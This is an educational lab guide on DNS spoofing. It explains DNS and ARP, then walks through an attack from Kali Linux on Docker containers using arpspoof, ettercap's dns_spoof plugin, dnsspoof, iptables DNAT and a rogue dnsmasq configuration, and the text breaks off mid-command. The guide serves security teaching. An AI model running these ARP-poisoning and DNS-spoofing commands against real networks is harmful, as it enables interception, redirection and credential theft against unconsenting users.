# DNS Spoofing Laboratory Guide

## Part 1: Theoretical Concepts

### 1. Introduction to Network Security
This laboratory focuses on DNS spoofing, a network attack that exploits vulnerabilities in the Domain Name System. Before diving into the practical exercise, it's essential to understand the underlying concepts and technologies involved.

### 2. Basic Network Concepts

#### 2.1 IP Addressing
- **Definition**: Unique numerical identifier for devices on a network.

<div class="network-diagram">
<h4>Network Addressing Example</h4>
<div class="device client">Client<br/>192.168.1.10</div>
<span class="arrow">→</span>
<div class="device router">Router<br/>192.168.1.1</div>
<span class="arrow">→</span>
<div class="device server">Server<br/>93.184.216.34</div>
</div>

The diagram illustrates basic communication between devices on a network using IP addresses. The elements of this communications are:

- **Client (192.168.1.10)**: Represents your personal computer or any device that initiates communication. It has a private IP from the local network.
- **Router (192.168.1.1)**: The gateway that connects your local network to the Internet. It acts as an intermediary between your home network and the outside world.
- **Server (93.184.216.34)**: A server on the Internet with a public IP that provides web services or resources.

When you type a URL in your browser, the request travels from your client to the router, and then to the destination server on the Internet. This fundamental process allows any device on your local network to communicate with remote servers through the Internet.

- **Types**
    * IPv4: 32-bit address (e.g., 192.168.1.1)
    * IPv6: 128-bit address (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334)
- **Assignment**
    * Static: Manually configured
    * Dynamic: Automatically assigned by DHCP

#### 2.2 MAC Addresses
- **Definition**: Physical hardware address of network interfaces

<div class="interactive-demo">
<h4>MAC Address Structure</h4>
<div class="code-highlight">
<strong>MAC Address Format:</strong> 00:1A:2B:3C:4D:5E<br/>
<span style="color: #007bff;">OUI (Vendor)</span> : <span style="color: #28a745;">Device Identifier</span><br/>
<span style="color: #007bff;">00:1A:2B</span> : <span style="color: #28a745;">3C:4D:5E</span>
</div>
</div>

This diagram shows the structure of a MAC (Media Access Control) address. A MAC address consists of two main parts:

- **OUI (Organizationally Unique Identifier)**: The first 3 bytes (00:1A:2B) identify the device manufacturer. Each manufacturer has unique codes assigned by the IEEE.
- **Device Identifier**: The last 3 bytes (3C:4D:5E) are unique for each device manufactured by that company.

This structure ensures that every network card in the world has a unique MAC address. It's like the "serial number" of your network card.

- **Characteristics**:
    * 48-bit length (e.g., 00:1A:2B:3C:4D:5E)
    * Unique to each network interface
    * Used for local network communication
    * Cannot be permanently changed (but can be spoofed)

#### 2.3 Network Layers (OSI Model)
1. **Layer 2 (Data Link)**

   * Handles MAC addressing
   * Where ARP operates
   * Local network communication

2. **Layer 3 (Network)**

   * IP addressing and routing
   * Internet-wide communication
   * Where our attack will operate

3. **Layer 7 (Application)**

   * DNS and web services
   * End-user applications
   * Where the impact will be visible

### 3. DNS System

#### 3.1 What is DNS?
The Domain Name System translates human-readable domain names (like www.example.com) into IP addresses that computers can use. Think of it as a network's phone book.

<div class="network-diagram">
<h4>DNS Resolution Flow</h4>
<div class="device client">User<br/>Query: "www.google.com"</div>
<span class="arrow">→</span>
<div class="device router">Local Cache<br/>Check: Cache Miss</div>
<span class="arrow">→</span>
<div class="device router">Recursive Resolver<br/>ISP DNS: 8.8.8.8</div>
<span class="arrow">→</span>
<div class="device router">Root Server<br/>Response: ".com NS"</div>
<span class="arrow">→</span>
<div class="device router">TLD Server<br/>Response: "google.com NS"</div>
<span class="arrow">→</span>
<div class="device server">Authoritative Server<br/>Response: "142.250.185.14"</div>
</div>

<div class="interactive-demo">
<h4>DNS Translation Process</h4>
<div class="code-highlight">
<strong>Input:</strong> www.google.com (Human-readable domain)<br/>
<strong>Process:</strong> DNS Resolution Chain<br/>
<strong>Output:</strong> 142.250.185.14 (Machine-readable IP)<br/>
<strong>Time:</strong> ~50-200ms (typical)<br/>
<strong>Translation:</strong> Domain Name ↔ IP Address Mapping
</div>
</div>

**DNS Resolution Flow Diagram:**

This first diagram shows the network components and data flow when you type a web address in your browser. Each device in the chain plays a specific role in resolving domain names to IP addresses:

**DNS Resolution Chain Components:**

1. **User Query**: Your computer initiates a request for "www.google.com" - a human-readable domain name
2. **Local Cache Check**: First checks if the domain-to-IP mapping is already stored locally (cache miss in this example)
3. **Recursive Resolver (ISP DNS)**: Your Internet provider's DNS server (like 8.8.8.8) takes over the resolution process
4. **Root Server**: Returns nameserver information for the ".com" top-level domain
5. **TLD Server**: Provides nameserver information specifically for "google.com" domain
6. **Authoritative Server**: Contains the actual DNS record and returns the final IP address "142.250.185.14"

**DNS Translation Process Diagram:**

This second diagram focuses specifically on the translation concept, showing how DNS converts between human-readable and machine-readable formats:

---

**Domain-to-IP Translation Details:**

- **Input**: Human-friendly domain name (www.google.com)
- **Processing**: Multi-step DNS hierarchy navigation through the resolution chain
- **Output**: Machine-readable IP address (142.250.185.14)
- **Performance**: Typical resolution time ranges from 50-200 milliseconds
- **Translation Function**: Acts as a bidirectional mapping between domain names and IP addresses

This translation process is essential because while humans prefer memorable domain names, computers and routers need numerical IP addresses to route traffic across the Internet. The DNS system acts as the universal translator between these two addressing systems.

#### 3.2 DNS Resolution Process
1. **Query Flow**:
   ```
   User → Local DNS Cache → Recursive Resolver → Root Servers → TLD Servers → Authoritative Servers
   ```

<div class="timeline">
<div class="timeline-item">
<strong>Step 1:</strong> User requests www.google.com → Browser needs IP address
</div>
<div class="timeline-item">
<strong>Step 2:</strong> Check local DNS cache → No cached IP for google.com
</div>
<div class="timeline-item">
<strong>Step 3:</strong> Query recursive resolver → ISP DNS server searches
</div>
<div class="timeline-item">
<strong>Step 4:</strong> Contact root servers → Get .com nameservers
</div>
<div class="timeline-item">
<strong>Step 5:</strong> Query TLD servers → Get google.com nameservers
</div>
<div class="timeline-item">
<strong>Step 6:</strong> Get IP from authoritative server → Receive 142.250.185.14
</div>
<div class="timeline-item">
<strong>Step 7:</strong> Return IP to user → Browser connects to 142.250.185.14
</div>
</div>

**Process Explanation:**
This timeline diagram shows the step-by-step domain-to-IP translation process. Each step represents how DNS converts human-readable domain names into machine-readable IP addresses:

1. **Step 1**: User types "www.google.com" in browser → System recognizes need for IP address translation
2. **Step 2**: Check local DNS cache → Search for cached IP address mapping (cache miss occurs)
3. **Step 3**: Query ISP's recursive resolver → Forward domain resolution request to provider's DNS
4. **Step 4**: Contact root servers → Obtain nameserver information for ".com" top-level domain
5. **Step 5**: Query .com TLD servers → Get specific nameserver information for "google.com"
6. **Step 6**: Query authoritative server → Receive actual IP address "142.250.185.14"
7. **Step 7**: Return IP to browser → Complete translation allows connection to Google's server

**Key Domain-to-IP Translation Concepts:**
- **Domain Name**: Human-friendly identifier (www.google.com)
- **IP Address**: Numerical network identifier (142.250.185.14)
- **DNS Resolution**: The translation process between domain and IP
- **Caching**: Storing previous translations to speed up future requests
- **TTL (Time To Live)**: How long the IP address mapping remains valid

This entire domain-to-IP translation process typically takes 50-200 milliseconds and is completely transparent to the user. Once complete, your browser uses the IP address to establish a direct connection to the web server.

2. **Server Types**:
   - Root Servers: Directory of TLD servers
   - TLD Servers: Manage .com, .org, etc.
   - Authoritative Servers: Hold actual DNS records
   - Recursive Resolvers: Handle lookups for clients

3. **DNS Record Types and Domain-to-IP Resolution**:

<div class="interactive-demo">
<h4>DNS Record Types for Domain Resolution</h4>
<div class="code-highlight">
<strong>A Record:</strong> www.google.com → 142.250.185.14 (IPv4)<br/>
<strong>AAAA Record:</strong> www.google.com → 2607:f8b0:4004:c1b::64 (IPv6)<br/>
<strong>CNAME Record:</strong> mail.google.com → googlemail.l.google.com<br/>
<strong>MX Record:</strong> google.com → smtp.google.com (Mail server)<br/>
<strong>TXT Record:</strong> google.com → "v=spf1 include:_spf.google.com ~all"<br/>
<strong>NS Record:</strong> google.com → ns1.google.com (Nameserver)
</div>
</div>

**DNS Record Types Explanation:**
Each DNS record type serves a specific purpose in domain-to-IP resolution and service discovery:

- **A Record (Address)**: The most common record type that directly maps a domain name to an IPv4 address. When you visit www.google.com, the A record tells your browser to connect to 142.250.185.14.

- **AAAA Record (IPv6 Address)**: Similar to A records but for IPv6 addresses. Provides the next-generation Internet addressing for the same domain.

- **CNAME Record (Canonical Name)**: Creates an alias from one domain to another. Instead of pointing to an IP, it points to another domain name that then resolves to an IP.

- **MX Record (Mail Exchange)**: Specifies which server handles email for the domain. When you send email to someone@google.com, MX records tell the system where to deliver it.

- **TXT Record (Text)**: Contains human-readable text, often used for verification, security policies (SPF, DKIM), or configuration information.

- **NS Record (Name Server)**: Indicates which DNS servers are authoritative for the domain, essential for the DNS resolution hierarchy.

**Domain Resolution Priority:**
1. **Direct IP Resolution**: A/AAAA records provide immediate IP addresses
2. **Alias Resolution**: CNAME records require additional lookups
3. **Service Resolution**: MX records for specific service routing
4. **Administrative**: NS and TXT records for management and verification

### 4. ARP Protocol

#### 4.1 Basic Operation
1. **Purpose**: Maps IP addresses to MAC addresses

<div class="network-diagram">
<h4>Normal ARP Process</h4>
<div class="device client">Client<br/>IP: 192.168.1.10<br/>MAC: AA:BB:CC:DD:EE:FF</div>
<span class="arrow">→</span>
<div class="packet arp">ARP Request<br/>"Who has 192.168.1.1?"</div>
<span class="arrow">→</span>
<div class="device router">Router<br/>IP: 192.168.1.1<br/>MAC: 11:22:33:44:55:66</div>
<br/><br/>
<div class="device router">Router</div>
<span class="arrow">→</span>
<div class="packet arp">ARP Reply<br/>"192.168.1.1 is at 11:22:33:44:55:66"</div>
<span class="arrow">→</span>
<div class="device client">Client</div>
</div>

**Diagram Explanation:**
This diagram shows the normal ARP (Address Resolution Protocol) process that allows devices to discover the MAC addresses of other devices on the network:

**First row** (ARP Query):
- **Client (left)**: A computer with IP 192.168.1.10 and MAC AA:BB:CC:DD:EE:FF
- **ARP Packet (center)**: The query message "Who has IP 192.168.1.1?"
- **Router (right)**: The router with IP 192.168.1.1 and MAC 11:22:33:44:55:66

**Second row** (ARP Reply):
- **Router**: Sends the reply back
- **ARP Packet**: The response message "192.168.1.1 is at 11:22:33:44:55:66"
- **Client**: Receives the response and updates its ARP table

This communication is fundamental for devices to communicate on the local network, as they need to know MAC addresses to send data at the link layer.

2. **Normal Process**:
   - Device broadcasts ARP request asking "Who has this IP?"
   - Target device responds with "I have that IP, here's my MAC address"
   - Requesting device updates its ARP table with the IP-MAC mapping

#### 4.2 ARP Vulnerabilities
- No authentication mechanism
- Accepts unsolicited responses
- Cached entries can be overwritten
- Trust-based system

<div class="network-diagram attack">
<h4>ARP Poisoning Attack</h4>
<div class="device client">Victim</div>
<span class="arrow attack">←</span>
<div class="device attacker">Attacker<br/>Sends fake ARP</div>
<span class="arrow attack">→</span>
<div class="device router">Router</div>
<br/><br/>
<div class="packet spoofed">"192.168.1.1 is at [Attacker MAC]"</div>
<span class="arrow attack">→</span>
<div class="device client">Victim believes<br/>Router is Attacker</div>
</div>

**ARP Poisoning Attack Explanation:**
This diagram illustrates how an attacker can poison ARP tables to intercept traffic:

**Attack components:**
- **Victim (left)**: The target device that will be deceived
- **Attacker (center)**: The malicious device that will send false ARP responses
- **Router (right)**: The legitimate network router
- **Spoofed packet (bottom)**: The false ARP message saying "192.168.1.1 is at [Attacker's MAC]"

**How the attack works:**
1. The attacker sends false ARP messages to the victim telling them that they have the router's MAC
2. Also sends false ARP messages to the router telling it that they have the victim's MAC
3. As a result, both the victim and router believe the attacker is the device they should communicate with
4. All traffic between victim and router now passes through the attacker, who can intercept or modify it

Red arrows indicate malicious/compromised communication.

### 5. Attack Fundamentals

#### 5.1 DNS Spoofing
- **Definition**: Technique to forge DNS responses
- **Purpose**: Redirect traffic to malicious servers
- **Impact**: Can lead to:
    * Credential theft
    * Data interception
    * Malware distribution
    * Privacy violations

<div class="network-diagram attack">
<h4>DNS Spoofing Attack Flow</h4>
<div class="device client">Victim</div>
<span class="arrow">→</span>
<div class="packet dns">DNS Query<br/>example.com?</div>
<span class="arrow">→</span>
<div class="device attacker">Attacker<br/>Intercepts</div>
<br/><br/>
<div class="device attacker">Attacker</div>
<span class="arrow attack">→</span>
<div class="packet spoofed">Fake DNS Reply<br/>example.com = [Evil IP]</div>
<span class="arrow attack">→</span>
<div class="device client">Victim</div>
<br/><br/>
<div class="device client">Victim connects to</div>
<span class="arrow attack">→</span>
<div class="device attacker">Malicious Server</div>
</div>

**DNS Spoofing Attack Explanation:**
This diagram shows how a DNS Spoofing attack works in three phases:

**First row** (Intercepted DNS Query):
- **Victim (left)**: The user makes a normal DNS query
- **DNS Packet (center)**: The query "What's the IP of example.com?"
- **Attacker (right)**: Intercepts the query before it reaches the legitimate DNS server

**Second row** (False Response):
- **Attacker**: Sends a false DNS response
- **Spoofed packet**: Contains the false response "example.com = [Malicious IP]"
- **Victim**: Receives and believes the false response

**Third row** (Traffic Redirection):
- **Victim**: Connects to what they think is example.com
- **Attacker**: Controls the malicious server where the victim was redirected

The result is that the victim accesses the server controlled by the attacker instead of the legitimate website.

#### 5.2 ARP Poisoning
- **Definition**: Technique to intercept network traffic
- **Process**: Attacker sends false ARP messages to associate their MAC address with victim's and router's IP addresses
- **Result**: All traffic flows through attacker

#### 5.3 Man-in-the-Middle Position

<div class="network-diagram attack">
<h4>Complete Attack Chain</h4>
<div class="step-animation warning">
<strong>Step 1:</strong> ARP Poisoning - Position between victim and router
</div>
<div class="device client">Client</div>
<span class="arrow attack">↔</span>
<div class="device attacker">Attacker<br/>(MITM)</div>
<span class="arrow attack">↔</span>
<div class="device router">Router</div>
<span class="arrow">↔</span>
<div class="device server">Internet</div>

<div class="step-animation warning">
<strong>Step 2:</strong> DNS Interception - Capture and modify DNS queries
</div>
<div class="packet dns">DNS Query</div>
<span class="arrow attack">→</span>
<div class="device attacker">Modify</div>
<span class="arrow attack">→</span>
<div class="packet spoofed">Fake Response</div>

<div class="step-animation warning">
<strong>Step 3:</strong> Traffic Redirection - Victim connects to malicious server
</div>
</div>

**Complete Attack Chain Explanation:**
This diagram shows the complete sequence of a Man-in-the-Middle attack with DNS Spoofing in three steps:

**Step 1 - Attacker Positioning:**
- **Client**: The victim to be attacked
- **Attacker (MITM)**: Positions themselves as intermediary using ARP Poisoning
- **Router**: The legitimate gateway
- **Internet**: Represents normal Internet connection

The red bidirectional arrows show that all traffic between client and router now passes through the attacker.

**Step 2 - DNS Interception:**
- **DNS Query**: The original DNS query from the client
- **Attacker**: Intercepts and modifies the query
- **Fake Response**: The false DNS response that redirects to a malicious server

**Step 3 - Traffic Redirection:**
Once the previous steps are executed, the victim is automatically redirected to the attacker-controlled server when trying to access specific websites.

This attack combines low-level network techniques (ARP) with application attacks (DNS) to create a complete interception scenario.

### 6. Security Considerations

#### 6.1 Legal and Ethical Aspects
- Only perform on authorized systems
- Obtain written permission
- Document all activities
- Use in controlled environments

#### 6.2 Protection Mechanisms
- DNSSEC
- SSL/TLS certificates
- DNS over HTTPS (DoH)
- Network monitoring
- Regular security audits

## Part 2: Practical Exercise

### 1. Laboratory Environment - Kali Linux + Docker Setup

<div class="network-diagram secure">
<h4>Kali Linux Attack Lab Network Topology</h4>
<div class="device attacker">Kali Linux Host<br/>192.168.1.20<br/>Attack Platform</div>
<span class="arrow attack">↔</span>
<div class="device router">Gateway<br/>192.168.1.1</div>
<span class="arrow">↔</span>
<div class="device server">DNS Server<br/>192.168.1.4<br/>dnsmasq container</div>
<br/><br/>
<div class="device client">Requester<br/>192.168.1.30<br/>Ubuntu container</div>
<span class="arrow">↔</span>
<div class="device router">macvlan Bridge<br/>eth0</div>
<span class="arrow">↔</span>
<div class="device server">Good Web Server<br/>192.168.1.10<br/>goodserver.com</div>
<br/><br/>
<div class="device attacker">Evil Web Server<br/>192.168.1.100<br/>container target</div>
<span class="arrow attack">↔</span>
<div class="device attacker">Kali Linux<br/>Network Controller</div>
<span class="arrow attack">↔</span>
<div class="device router">Docker Network<br/>Management</div>
<br/><br/>
<div class="interactive-demo">
<strong>Hybrid Environment:</strong><br/>
• Kali Linux: Physical attack machine<br/>
• Docker containers: Target environment<br/>
• Macvlan network: 192.168.1.0/24<br/>
• Network manipulation capabilities
</div>
</div>

**Kali Linux Attack Lab Topology Explanation:**
This diagram shows the hybrid network configuration where a physical Kali Linux machine attacks containerized services:

**Physical components:**
- **Kali Linux Host (192.168.1.20)**: Physical attack machine with full network access and Docker control
- **Gateway (192.168.1.1)**: Physical network router connecting all devices

**Container components:**
- **DNS Server (192.168.1.4)**: dnsmasq container handling DNS resolution
- **Good Web Server (192.168.1.10)**: FastAPI container serving goodserver.com  
- **Evil Web Server (192.168.1.100)**: Malicious FastAPI container for redirection
- **Requester Client (192.168.1.30)**: Ubuntu container acting as victim making HTTP requests

**Attack capabilities:**
- **Network Control**: Kali can manipulate Docker network traffic using ARP poisoning and DNS spoofing
- **Container Management**: Direct access to modify container configurations and network routing
- **Traffic Interception**: Position between containers and legitimate services
- **Real-time Monitoring**: Complete visibility of attack effects on containerized services

#### 1.1 Required Tools and Prerequisites
1. **Kali Linux machine** with network access to Docker host
2. **Docker and Docker Compose** installed on target host
3. **Root privileges** on both Kali Linux and Docker host
4. **Network tools** installed on Kali Linux:
   - ettercap
   - dsniff  
   - arpspoof
   - nmap
   - wireshark
5. **SSH access** to Docker host (if running remotely)
6. **Available network interface** (eth0 by default) for macvlan bridge

#### 1.2 Initial Setup

<div class="step-animation">
<strong>Step 1:</strong> Prepare Kali Linux Attack Environment
</div>

```bash
# Update Kali Linux and install required tools
sudo apt update && sudo apt upgrade -y
sudo apt install -y ettercap-text-only dsniff nmap wireshark tcpdump arpspoof

# Verify network tools are installed
ettercap --version
arpspoof 2>&1 | head -1
nmap --version
```

<div class="step-animation">
<strong>Step 2:</strong> Setup Docker Environment on Target Host
</div>

```bash
# On Docker host (can be same machine as Kali or remote)
git clone https://github.com/your-repo/TFM-Labos.git
cd TFM-Labos/src

# Review environment configuration
cat .env
```

<div class="interactive-demo">
<h4>Network Configuration</h4>
<div class="code-highlight">
<strong>Docker Host Network:</strong> 192.168.1.0/24<br/>
<strong>Kali Linux IP:</strong> 192.168.1.20 (static recommended)<br/>
<strong>DNS Server:</strong> 192.168.1.4 (container)<br/>
<strong>Good Web Server:</strong> 192.168.1.10 (goodserver.com)<br/>
<strong>Evil Web Server:</strong> 192.168.1.100 (attack target)<br/>
<strong>Victim Client:</strong> 192.168.1.30 (container)
</div>
</div>

<div class="step-animation">
<strong>Step 3:</strong> Start Docker Laboratory Environment
</div>

```bash
# Start all containers (on Docker host)
docker-compose up -d

# Verify all containers are running
docker-compose ps

# Check container network configuration
docker network ls
docker network inspect src_internal_network
```

<div class="step-animation">
<strong>Step 4:</strong> Verify Kali Linux Network Access
</div>

```bash
# From Kali Linux, verify connectivity to containers
ping -c 3 192.168.1.4   # DNS server
ping -c 3 192.168.1.10  # Good web server  
ping -c 3 192.168.1.30  # Victim client
ping -c 3 192.168.1.100 # Evil web server

# Scan the Docker network
nmap -sn 192.168.1.0/24

# Test initial DNS resolution
nslookup goodserver.com 192.168.1.4
```

**Initial Setup Explanation:**
- **Kali Linux**: Physical attack machine with full control over network tools and protocols
- **Docker host**: Can be the same machine as Kali or a separate system running the containerized lab
- **Network bridging**: The macvlan network allows containers to appear as physical devices on the network
- **Attack positioning**: Kali Linux has direct access to manipulate traffic between containers

### 2. Attack Implementation from Kali Linux

<div class="timeline">
<div class="timeline-item attack">
<strong>Phase 1:</strong> Network Reconnaissance and Analysis
</div>
<div class="timeline-item attack">
<strong>Phase 2:</strong> ARP Poisoning Setup
</div>
<div class="timeline-item attack">
<strong>Phase 3:</strong> DNS Spoofing Implementation
</div>
<div class="timeline-item attack">
<strong>Phase 4:</strong> Attack Monitoring and Verification
</div>
</div>

**Attack Phases Explanation:**
This timeline shows the four main phases for executing a DNS Spoofing attack from Kali Linux against the Docker containers:

- **Phase 1 - Network Reconnaissance**: Discover container topology and identify attack targets
- **Phase 2 - ARP Poisoning**: Position Kali Linux as man-in-the-middle between containers
- **Phase 3 - DNS Spoofing**: Intercept and modify DNS queries from victim container
- **Phase 4 - Attack Monitoring**: Observe traffic redirection and attack success

Each phase leverages Kali Linux's powerful network tools to manipulate the containerized environment.

#### 2.1 Phase 1: Network Reconnaissance and Analysis

<div class="step-animation">
<strong>Step 1:</strong> Discover Container Network Topology
</div>

```bash
# From Kali Linux - Scan the Docker network
nmap -sn 192.168.1.0/24

# Detailed scan of active containers
nmap -sV -O 192.168.1.4,192.168.1.10,192.168.1.30,192.168.1.100

# Check ARP table to see current MAC addresses
arp -a | grep "192.168.1"

# Monitor current network traffic
sudo tcpdump -i eth0 -n net 192.168.1.0/24
```

<div class="step-animation">
<strong>Step 2:</strong> Analyze Container Communications
</div>

```bash
# Monitor DNS traffic from victim container
sudo tcpdump -i eth0 -n port 53

# Monitor HTTP traffic patterns
sudo tcpdump -i eth0 -n port 80 and host 192.168.1.30

# Test current DNS resolution behavior
nslookup goodserver.com 192.168.1.4
dig @192.168.1.4 goodserver.com
```

#### 2.2 Phase 2: ARP Poisoning Setup

<div class="step-animation success">
<strong>Step 1:</strong> Enable IP Forwarding on Kali Linux
</div>

```bash
# Enable IP forwarding to maintain connectivity
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify IP forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward
```

<div class="step-animation success">
<strong>Step 2:</strong> Execute ARP Poisoning Attack
</div>

```bash
# Method 1: Using arpspoof (simple)
# Terminal 1: Poison victim -> DNS server
sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4

# Terminal 2: Poison DNS server -> victim  
sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30

# Method 2: Using ettercap (advanced)
# Single command for bidirectional ARP poisoning
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//
```

<div class="step-animation success">
<strong>Step 3:</strong> Verify ARP Poisoning Success
</div>

```bash
# Check if traffic is flowing through Kali Linux
sudo tcpdump -i eth0 -n host 192.168.1.30 and host 192.168.1.4

# Monitor for DNS queries being intercepted
sudo tcpdump -i eth0 -n port 53 and host 192.168.1.30
```

#### 2.3 Phase 3: DNS Spoofing Implementation

<div class="step-animation success">
<strong>Step 1:</strong> Configure DNS Spoofing with ettercap
</div>

```bash
# Create DNS spoofing configuration
sudo nano /etc/ettercap/etter.dns

# Add DNS redirection rules
echo "goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns
echo "*.goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns

# Launch ettercap with DNS spoofing
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4// -P dns_spoof
```

<div class="step-animation success">
<strong>Step 2:</strong> Alternative Method - Using dnsspoof
</div>

```bash
# Create hosts file for dnsspoof
echo "192.168.1.100 goodserver.com" | sudo tee /tmp/dns_hosts

# Start ARP poisoning in background
sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4 &
sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30 &

# Start DNS spoofing
sudo dnsspoof -i eth0 -f /tmp/dns_hosts host 192.168.1.30
```

<div class="step-animation success">
<strong>Step 3:</strong> Monitor Attack Implementation
</div>

```bash
# Real-time monitoring of DNS spoofing
sudo tcpdump -i eth0 -n -s 0 port 53 and host 192.168.1.30

# Monitor HTTP redirection to evil server
sudo tcpdump -i eth0 -n port 80 and host 192.168.1.100
```

#### 2.4 Method 1: Network-based DNS Spoofing from Kali Linux (Primary Method)

<div class="network-diagram attack">
<h4>Kali Linux DNS Spoofing Attack Flow</h4>
<div class="device client">Victim Container<br/>192.168.1.30</div>
<span class="arrow">→</span>
<div class="packet dns">DNS Query<br/>goodserver.com?</div>
<span class="arrow attack">→</span>
<div class="device attacker">Kali Linux<br/>192.168.1.20<br/>(MITM)</div>
<br/><br/>
<div class="device attacker">Kali Linux<br/>ARP Poisoned</div>
<span class="arrow attack">→</span>
<div class="packet spoofed">Fake DNS Reply<br/>goodserver.com = 192.168.1.100</div>
<span class="arrow attack">→</span>
<div class="device client">Victim Container</div>
<br/><br/>
<div class="device client">Victim connects to</div>
<span class="arrow attack">→</span>
<div class="device attacker">Evil Server<br/>192.168.1.100</div>
<span class="arrow">→</span>
<div class="device attacker">Kali Controlled</div>
</div>

**Kali Linux DNS Spoofing Explanation:**
This method demonstrates real-world DNS spoofing using network manipulation from Kali Linux:

**First row** (DNS Interception):
- **Victim Container**: Ubuntu container making DNS queries for goodserver.com
- **DNS Query**: Standard DNS lookup that should go to 192.168.1.4
- **Kali Linux (MITM)**: Intercepts query due to ARP poisoning positioning

**Second row** (Malicious Response):
- **Kali Linux**: Responds with spoofed DNS reply instead of forwarding to legitimate DNS
- **Fake DNS Reply**: Returns evil server IP (192.168.1.100) instead of legitimate IP (192.168.1.10)
- **Victim Container**: Receives and trusts the false response

**Third row** (Traffic Redirection):
- **Victim**: Connects to what it believes is goodserver.com
- **Evil Server**: Container controlled by attacker receives the redirected traffic
- **Attack Success**: Kali Linux successfully manipulates container-to-container communication

This method demonstrates how an external attacker can manipulate containerized environments.

#### 2.5 Method 2: Docker Network Manipulation (Alternative Method)

For additional demonstration, you can also show direct Docker network manipulation:

<div class="step-animation">
<strong>Step 1:</strong> Docker Network Analysis from Kali
</div>

```bash
# If Docker is accessible from Kali (same machine or SSH access)
# Analyze Docker network configuration
docker network inspect src_internal_network

# View container network settings
docker inspect src_http_requester_1 | grep -A 10 "NetworkSettings"
docker inspect src_dns_1 | grep -A 10 "NetworkSettings"
```

<div class="step-animation">
<strong>Step 2:</strong> Container DNS Configuration Manipulation
</div>

```bash
# Method 2A: Modify container DNS settings (if Docker access available)
# Stop victim container temporarily
docker stop src_http_requester_1

# Modify container to use Kali as DNS server (advanced)
# This requires container recreation with new DNS settings

# Method 2B: Network namespace manipulation
sudo ip netns list
sudo ip netns exec container_namespace iptables -t nat -A OUTPUT -p tcp --dport 53 -j DNAT --to-destination 192.168.1.20:53
```

<div class="step-animation">
<strong>Step 3:</strong> Hybrid Attack - DNS Server + Network Manipulation
</div>

```bash
# Run a rogue DNS server on Kali Linux
# Install and configure dnsmasq on Kali
sudo apt install dnsmasq

# Configure rogue DNS server
cat << EOF | sudo tee /etc/dnsmasq.d/attack.conf
# Listen on Kali interface
interface=eth0
bind-interfaces
listen-address=192.168.1.20

# Spoofed entries
address=/goodserver.com/192.168.1.100
address=/evilserver.com/192.168.1.100

# Forward other queries to legitimate DNS
server=8.8.8.8
EOF

# Start rogue DNS server
sudo systemctl restart dnsmasq

# Use ARP poisoning to redirect DNS queries to Kali
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//
```

<div class="interactive-demo">
<h4>Attack Method Comparison</h4>
<div class="code-highlight">
<strong>Network Method:</strong> ARP poisoning + DNS interception (Primary)<br/>
<strong>Docker Method:</strong> Container manipulation + network redirection<br/>
<strong>Hybrid Method:</strong> Rogue DNS server + network positioning<br/>
<strong>Stealth Level:</strong> Network (High) vs Docker (Medium) vs Hybrid (Low)<br/>
<strong>Persistence:</strong> Network (Temporary) vs Docker (Persistent) vs Hybrid (Configurable)
</div>
</div>

### 3. Monitoring and Verification from Kali Linux

#### 3.1 Real-time Attack Monitoring

<div class="step-animation">
<strong>Step 1:</strong> Monitor Attack Traffic from Kali Linux
</div>

```bash
# Terminal 1: Monitor all DNS traffic on network
sudo tcpdump -i eth0 -n -s 0 port 53

# Terminal 2: Monitor HTTP traffic redirection
sudo tcpdump -i eth0 -n port 80 and \(host 192.168.1.30 or host 192.168.1.100\)

# Terminal 3: Monitor ARP poisoning effectiveness
sudo tcpdump -i eth0 -n arp

# Terminal 4: Check victim container logs (if Docker access available)
# docker logs -f src_http_requester_1
```

<div class="step-animation">
<strong>Step 2:</strong> Verify Attack Success from Kali Linux
</div>

After implementing the DNS spoofing attack, verify success:

<div class="interactive-demo">
<h4>Expected Attack Indicators</h4>
<div class="code-highlight">
<strong>ARP Tables:</strong> Victim container shows Kali MAC for DNS server IP<br/>
<strong>DNS Queries:</strong> All victim DNS queries pass through Kali Linux<br/>
<strong>HTTP Traffic:</strong> Victim connects to 192.168.1.100 instead of 192.168.1.10<br/>
<strong>Response Change:</strong> "Hello from the GET method!" → "Evil GET greetings!"
</div>
</div>

#### 3.2 Detailed Verification Commands from Kali Linux

<div class="step-animation">
<strong>Step 1:</strong> Verify DNS Spoofing Success
</div>

```bash
# Test DNS resolution from Kali Linux perspective
nslookup goodserver.com 192.168.1.4

# Use dig for detailed DNS analysis
dig @192.168.1.4 goodserver.com

# Test if victim is using spoofed DNS
# Monitor network traffic while victim makes requests
sudo tcpdump -i eth0 -n -s 0 'port 53 and host 192.168.1.30'
```

<div class="step-animation">
<strong>Step 2:</strong> Network Traffic Analysis from Kali
</div>

```bash
# Capture and analyze victim's DNS queries
sudo tcpdump -i eth0 -n -w /tmp/dns_capture.pcap port 53 and host 192.168.1.30

# Analyze captured traffic with tshark
tshark -r /tmp/dns_capture.pcap -T fields -e ip.src -e ip.dst -e dns.qry.name -e dns.resp.addr

# Monitor HTTP redirection in real-time
sudo tcpdump -i eth0 -n -A port 80 and host 192.168.1.30
```

<div class="step-animation">
<strong>Step 3:</strong> Attack Impact Assessment
</div>

```bash
# Verify ARP poisoning is working
sudo arp -a | grep "192.168.1"

# Check if traffic flows through Kali Linux
sudo netstat -i  # Check interface packet counts

# Test direct connectivity to both servers from Kali
curl -s http://192.168.1.10 | jq  # Legitimate server
curl -s http://192.168.1.100 | jq # Evil server

# Monitor victim's connection attempts
sudo ss -tuln | grep ":80"
```

#### 3.3 Advanced Monitoring with Wireshark

<div class="step-animation">
<strong>Step 1:</strong> Wireshark Traffic Capture
</div>

```bash
# Start Wireshark from Kali Linux (GUI)
sudo wireshark &

# Or use command-line capture
sudo tshark -i eth0 -f "net 192.168.1.0/24" -w /tmp/lab_capture.pcap

# Real-time monitoring with filters
